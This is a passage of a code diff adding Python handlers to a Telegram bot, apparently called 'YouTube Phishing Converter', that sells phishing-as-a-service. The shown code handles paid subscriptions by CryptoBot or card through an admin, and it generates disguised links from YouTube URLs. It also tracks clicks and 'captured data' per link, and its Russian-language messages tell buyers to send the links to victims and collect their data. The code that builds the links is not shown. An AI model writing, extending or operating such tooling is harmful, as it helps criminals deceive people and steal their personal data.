+🔗 Лимит ссылок: {limits['links']}
+⏱️ Срок действия: {limits['lifetime']} дней
+⏳ Время жизни ссылок: {limits['link_lifetime']}
+
+✨ Включенные функции:
+""")
+        
+        for feature in limits['features']:
+            text += format_bold_text(f"• {feature}\n")
+        
+        if subscription_type == 'basic':
+            text += format_bold_text("""
+⚠️ Ограничения базовой подписки:
+• Максимум 100 ссылок за 30 дней
+• Время жизни ссылок: 2-3 дня
+• Очередь генерации: низкий приоритет
+• Поддержка: стандартная (ответ в течение 24 часов)
+• Нет доступа к кастомным доменам
+• Ограниченная техподдержка
+""")
+        elif subscription_type == 'pro':
+            text += format_bold_text("""
+⭐ Преимущества PRO подписки:
+• 500 ссылок за 90 дней
+• Время жизни ссылок: 5-7 дней
+• Высокий приоритет очереди
+• Приоритетная поддержка (ответ в течение 6 часов)
+• Расширенный функционал
+""")
+        elif subscription_type == 'premium':
+            text += format_bold_text("""
+💎 Преимущества PREMIUM подписки:
+• Безлимитные ссылки
+• Время жизни ссылок: 14-30+ дней
+• Максимальный приоритет
+• Персональная поддержка 24/7
+• Кастомные домены
+• Все функции разблокированы
+""")
+        
+        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
+                             text, get_subscription_details_keyboard(subscription_type))
+    
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_crypto_'))
+async def buy_subscription_crypto(callback_query: types.CallbackQuery):
+    subscription_type = callback_query.data.replace('buy_crypto_', '')
+    
+    if subscription_type in SUBSCRIPTION_PRICES:
+        price = SUBSCRIPTION_PRICES[subscription_type]
+        user_id = callback_query.from_user.id
+        
+        await callback_query.answer("Создаем счет для оплаты...")
+        
+        description = f"Оплата {subscription_type} подписки YouTube Phishing Converter"
+        pay_url, invoice_id = await create_crypto_invoice(price, description)
+        
+        if pay_url and invoice_id:
+            # Сохраняем информацию о платеже
+            pending_payments[user_id] = {
+                'subscription_type': subscription_type,
+                'invoice_id': invoice_id,
+                'amount': price,
+                'payment_method': 'crypto'
+            }
+            
+            invoice_text = format_bold_text(f"""
+✅ СЧЕТ ДЛЯ ОПЛАТЫ СОЗДАН
+
+💰 Сумма: {price} ₽
+💎 Подписка: {subscription_type.upper()}
+💳 Способ оплаты: CryptoBot
+⏱️ Действителен: 60 минут
+
+🔒 Безопасная оплата через CryptoBot:
+• USDT (TRC20/ERC20) • TON • BTC
+• ETH • LTC • BNB
+
+🎁 После оплаты:
+1. Подписка активируется автоматически
+2. Вы получите уведомление
+3. Сможете создавать фишинг ссылки
+
+📞 При проблемах с оплатой: @htttpspubg
+""")
+            
+            markup = InlineKeyboardMarkup(row_width=1)
+            markup.add(
+                InlineKeyboardButton("💳 Оплатить в CryptoBot", url=pay_url),
+                InlineKeyboardButton("🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}"),
+                InlineKeyboardButton("« Назад к подпискам", callback_data="show_subscriptions")
+            )
+            
+            # Используем новую функцию для отправки фото
+            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
+                                      "photo8.png", invoice_text, markup)
+            
+        else:
+            await callback_query.answer("⚠️ Ошибка при создании счета. Попробуйте позже.", show_alert=True)
+    
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_card_'))
+async def buy_subscription_card(callback_query: types.CallbackQuery):
+    """Обработчик покупки подписки картой через администратора"""
+    subscription_type = callback_query.data.replace('buy_card_', '')
+    
+    if subscription_type in SUBSCRIPTION_PRICES:
+        price = SUBSCRIPTION_PRICES[subscription_type]
+        
+        card_text = format_bold_text(f"""
+💳 ОПЛАТА КАРТОЙ (ЧЕРЕЗ АДМИНИСТРАТОРА)
+
+💰 Сумма: {price} ₽
+💎 Подписка: {subscription_type.upper()}
+
+📋 ИНСТРУКЦИЯ:
+
+1. Нажмите кнопку "Написать админу" ниже
+2. Напишите администратору:
+   - Тип подписки: {subscription_type.upper()}
+   - Сумма: {price} ₽
+   - Ваш ID: {callback_query.from_user.id}
+
+3. Администратор отправит вам реквизиты карты
+4. Вы совершаете перевод
+5. Отправляете скриншот чека администратору
+6. Администратор вручную активирует подписку
+
+⏱️ Время активации: 5-15 минут после оплаты
+
+⚠️ ВАЖНО:
+• Реквизиты карты НЕ хранятся в боте
+• Все платежи обрабатываются вручную
+• Сохраняйте скриншот чека
+• Комиссия за перевод: 5%
+
+👨‍💻 Администратор: @htttpspubg
+""")
+        
+        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
+                            card_text, get_admin_payment_keyboard(subscription_type))
+    
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data.startswith('check_payment_'))
+async def check_payment(callback_query: types.CallbackQuery):
+    invoice_id = callback_query.data.replace('check_payment_', '')
+    user_id = callback_query.from_user.id
+    
+    # Проверяем, есть ли такой ожидающий платеж
+    if user_id in pending_payments and pending_payments[user_id]['invoice_id'] == invoice_id:
+        # Проверяем оплату через CryptoBot API
+        is_paid = await check_crypto_payment(invoice_id)
+        
+        if is_paid:
+            # Активируем подписку
+            subscription_type = pending_payments[user_id]['subscription_type']
+            lifetime = SUBSCRIPTION_LIMITS[subscription_type]['lifetime']
+            expiry_date = (datetime.datetime.now() + datetime.timedelta(days=lifetime)).strftime("%Y-%m-%d")
+            
+            # Активируем подписку
+            user_subscriptions[user_id] = {
+                'type': subscription_type,
+                'expiry': expiry_date,
+                'links_used': 0,
+                'links_limit': SUBSCRIPTION_LIMITS[subscription_type]['links']
+            }
+            
+            # Обновляем данные пользователя
+            user_data = get_user_data(user_id)
+            user_data['purchases_count'] += 1
+            user_data['total_spent'] += SUBSCRIPTION_PRICES[subscription_type]
+            
+            # Удаляем из ожидающих платежей
+            del pending_payments[user_id]
+            
+            success_text = format_bold_text(f"""
+✅ ПОДПИСКА АКТИВИРОВАНА!
+
+💎 Тип подписки: {subscription_type.upper()}
+⏱️ Действует до: {expiry_date}
+🔗 Лимит ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['links']}
+⏳ Время жизни ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['link_lifetime']}
+
+🎉 Теперь вы можете:
+1. Создавать фишинг-ссылки
+2. Отправлять их жертвам
+3. Собирать данные
+4. Отслеживать статистику
+
+👇 Начните работу прямо сейчас:
+""")
+            
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("🎬 Создать фишинг ссылку", callback_data="generate_link"))
+            markup.add(InlineKeyboardButton("👤 В личный кабинет", callback_data="back_to_profile"))
+            
+            # Используем новую функцию для отправки фото
+            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
+                                      "photo1.png", success_text, markup)
+            
+            await callback_query.answer("✅ Оплата подтверждена! Подписка активирована.", show_alert=True)
+        else:
+            await callback_query.answer("❌ Оплата не найдена. Пожалуйста, оплатите счет или попробуйте позже.", show_alert=True)
+    else:
+        await callback_query.answer("❌ Счет не найден или истек. Создайте новый счет.", show_alert=True)
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'quick_generate')
+async def quick_generate(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    
+    # Проверяем активную подписку
+    subscription_info = get_subscription_info(user_id)
+    
+    if not subscription_info:
+        text = format_bold_text("""
+❌ НЕТ АКТИВНОЙ ПОДПИСКИ
+
+Для генерации фишинг-ссылок необходима активная подписка.
+
+👇 Выберите подписку:
+""")
+        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
+                             text, get_subscriptions_keyboard())
+        await callback_query.answer()
+        return
+    
+    await dp.fsm.set_state(user_id, UserStates.waiting_for_youtube_url)
+    
+    text = format_bold_text(f"""
+🎬 ГЕНЕРАЦИЯ ФИШИНГ-ССЫЛКИ
+
+💎 Ваша подписка: {subscription_info['type'].upper()}
+🔗 Использовано ссылок: {subscription_info['links_used']}/{subscription_info['links_limit']}
+⏱️ Осталось дней: {subscription_info['days_left']}
+⏳ Время жизни ссылок: {SUBSCRIPTION_LIMITS[subscription_info['type']]['link_lifetime']}
+
+📝 Отправьте ссылку на YouTube видео:
+• https://youtube.com/watch?v=ID
+• https://youtu.be/ID
+• https://www.youtube.com/embed/ID
+
+💡 Пример:
+https://youtu.be/rVHGiFCuL-w?si=ht1BIGAqlMpuz53b
+""")
+    
+    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
+                         text, get_back_keyboard())
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'generate_link')
+async def generate_link(callback_query: types.CallbackQuery):
+    await quick_generate(callback_query)
+
+@dp.message(UserStates.waiting_for_youtube_url)
+async def process_youtube_url(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    youtube_url = message.text.strip()
+    
+    await state.clear()
+    
+    # Простая проверка на YouTube ссылку
+    if "youtube.com" in youtube_url or "youtu.be" in youtube_url:
+        # Генерируем фишинг-ссылку
+        phishing_link, error = generate_phishing_link(youtube_url, user_id)
+        
+        if error:
+            await message.answer(error, parse_mode='HTML')
+            
+            # Если лимит исчерпан или подписка истекла, предлагаем обновить
+            if "лимит" in error.lower() or "истекла" in error.lower():
+                markup = InlineKeyboardMarkup()
+                markup.add(InlineKeyboardButton("💎 Обновить подписку", callback_data="show_subscriptions"))
+                await message.answer(format_bold_text("Хотите обновить подписку?"), reply_markup=markup, parse_mode='HTML')
+            return
+        
+        # Обновляем статистика пользователя
+        user_data = get_user_data(user_id)
+        user_data['total_links'] = user_data.get('total_links', 0) + 1
+        
+        # Получаем информацию о подписке для отображения
+        subscription_info = get_subscription_info(user_id)
+        
+        response_text = format_bold_text(f"""
+✅ ФИШИНГ-ССЫЛКА СОЗДАНА!
+
+🔗 Оригинальная ссылка:
+{youtube_url}
+
+🎯 Фишинг-ссылка:
+{phishing_link}
+
+📊 Статистика подписки:
+├ 💎 Тип: {subscription_info['type'].upper()}
+├ 🔗 Использовано: {subscription_info['links_used']}/{subscription_info['links_limit']}
+├ ⏱️ Осталось дней: {subscription_info['days_left']}
+└ ⏳ Время жизни: {SUBSCRIPTION_LIMITS[subscription_info['type']]['link_lifetime']}
+
+📋 Как использовать:
+1. Скопируйте фишинг-ссылку
+2. Отправьте жертве
+3. Отслеживайте данные
+
+⚠️ Используйте ответственно!
+""")
+        
+        await message.answer(response_text, parse_mode='HTML')
+        
+        # Предлагаем создать ещё ссылку
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("🔄 Ещё ссылку", callback_data="generate_link"),
+            InlineKeyboardButton("📊 Мои ссылки", callback_data="my_phishing_links"),
+            InlineKeyboardButton("💎 Подписки", callback_data="show_subscriptions")
+        )
+        
+        await message.answer(format_bold_text("Хотите создать ещё ссылку?"), reply_markup=markup, parse_mode='HTML')
+        
+    else:
+        await message.answer(format_bold_text(f"""
+❌ НЕВЕРНАЯ ССЫЛКА
+
+Пожалуйста, отправьте корректную ссылку на YouTube видео.
+
+Пример: https://youtu.be/rVHGiFCuL-w?si=ht1BIGAqlMpuz53b
+"""), parse_mode='HTML')
+
+# --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ ---
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'my_phishing_links')
+async def my_phishing_links(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    links = user_generated_links.get(user_id, [])
+    
+    if links:
+        links_text = format_bold_text("🔗 ВАШИ ФИШИНГ-ССЫЛКИ\n\n")
+        for i, link in enumerate(links[-10:], 1):  # Последние 10 ссылок
+            links_text += format_bold_text(f"""
+#{i} | {link['timestamp']}
+├ 🎬 Оригинал: {link['original'][:50]}...
+├ 🎯 Фишинг: {link['phishing']}
+├ 👁️ Переходы: {link['clicks']}
+└ 📊 Данных: {len(link['data_captured'])} записей
+""")
+    else:
+        links_text = format_bold_text("""
+🔗 ВАШИ ФИШИНГ-ССЫЛКИ
+
+У вас пока нет созданных фишинг-ссылок.
+
+🎯 Как создать первую ссылку:
+1. Нажмите "Сгенерировать ссылку"
+2. Отправьте YouTube ссылку
+3. Получите фишинг-ссылку
+4. Отправьте жертве
+5. Получайте данные!
+""")
+    
+    links_text += format_bold_text(f"\n📊 Всего ссылок: {len(links)}")
+    
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("🔄 Новая ссылка", callback_data="generate_link"),
+        InlineKeyboardButton("« Назад", callback_data="back_to_profile")
+    )
+    
+    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
+                         links_text, markup)
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'top_up_balance')
+async def top_up_balance(callback_query: types.CallbackQuery):
+    await dp.fsm.set_state(callback_query.from_user.id, UserStates.waiting_for_amount)
+    text = format_bold_text("""
+💳 ПОПОЛНЕНИЕ БАЛАНСА
+
+Введите сумму пополнения (от 500 до 100000 ₽):
+
+⚠️ Минимальная сумма: 500 ₽
+Пополнение доступно только через CryptoBot
+""")
+    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
+                         text)
+    await callback_query.answer()
+
+@dp.message(UserStates.waiting_for_amount)
+async def process_top_up_amount(message: types.Message, state: FSMContext):
+    try:
+        amount = float(message.text)
+        if amount < 500:
+            await message.answer(format_bold_text("❌ Минимальная сумма пополнения: 500 ₽"))
+            return
+        elif amount > 100000:
+            await message.answer(format_bold_text("❌ Максимальная сумма пополнения: 100000 ₽"))
+            return
+            
+        await state.clear()
+        
+        text = format_bold_text(f"""
+✅ СУММА ПОДТВЕРЖДЕНА
+
+💰 Сумма пополнения: {amount:.0f} ₽
+
+👇 Выберите способ оплаты:
+Доступен только CryptoBot
+""")
+        
+        await message.answer(text, reply_markup=get_payment_methods_keyboard(), parse_mode='HTML')
+        
+    except ValueError:
+        await message.answer(format_bold_text("❌ Пожалуйста, введите корректную сумму (только цифры)"))
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'payment_card')
+async def process_payment_card(callback_query: types.CallbackQuery):
+    """Обработчик выбора оплаты картой"""
+    await callback_query.answer("💳 Оплата картой через администратора")
+    
+    text = format_bold_text(f"""
+💳 ОПЛАТА КАРТОЙ (ЧЕРЕЗ АДМИНИСТРАТОРА)
+
+📋 ИНСТРУКЦИЯ:
+
+1. Нажмите кнопку "Написать админу" ниже
+2. Напишите администратору:
+   - Сумму пополнения
+   - Ваш ID: {callback_query.from_user.id}
+
+3. Администратор отправит вам реквизиты карты
+4. Вы совершаете перевод
+5. Отправляете скриншот чека администратору
+6. Администратор вручную пополняет баланс
+
+⏱️ Время пополнения: 5-15 минут после оплата
+
+⚠️ ВАЖНО:
+• Реквизиты карты НЕ хранятся в боте
+• Все платежи обрабатываются вручную
+• Сохраняйте скриншот чека
+• Комиссия за перевод: 5%
+
+👨‍💻 Администратор: @htttpspubg
+""")
+    
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton("👨‍💻 Написать админу", url="https://t.me/htttpspubg"),
+        InlineKeyboardButton("« Назад к выбору оплаты", callback_data="top_up_balance")
+    )
+    
+    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
+                         text, markup)
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'payment_crypto')
+async def process_payment_crypto(callback_query: types.CallbackQuery):
+    await callback_query.answer("💎 Перенаправляем в CryptoBot...")
+    text = format_bold_text("""
+✅ ОПЛАТА ЧЕРЕЗ CRYPTOBOT
+
+1. Перейдите по ссылке ниже
+2. Выберите криптовалюту
+3. Оплатите счет
+4. Баланс пополнится автоматически
+
+⚠️ Внимание:
+Оплата через CryptoBot полностью анонимна.
+Средства поступают в течение 1-3 минут.
+""")
+    
+    markup = InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        InlineKeyboardButton("💎 Перейти в CryptoBot", url="https://t.me/CryptoBot"),
+        InlineKeyboardButton("« Назад к выбору оплаты", callback_data="top_up_balance")
+    )
+    
+    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
+                         text, markup)
+
+# --- ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД ---
+
+@dp.message()
+async def handle_unknown(message: types.Message):
+    unknown_text = format_bold_text("""
+⚠️ КОМАНДА НЕ РАСПОЗНАНА
+
+Пожалуйста, используйте кнопки меню или команды:
+
+🏠 Основные команды:
+/start - Главное меню
+/profile - Личный кабинет
+/balance - Мой баланс
+/subscriptions - Подписки
+/support - Техподдержка
+
+💡 Или выберите раздел в меню ниже:
+""")
+    await message.answer(unknown_text, reply_markup=get_main_keyboard(), parse_mode='HTML')
+
+async def main():
+    """Основная функция запуска бота"""
+    logging.info("YouTube Phishing Converter Bot запущен...")
+    await dp.start_polling(bot)
+
+if __name__ == '__main__':
+    asyncio.run(main())
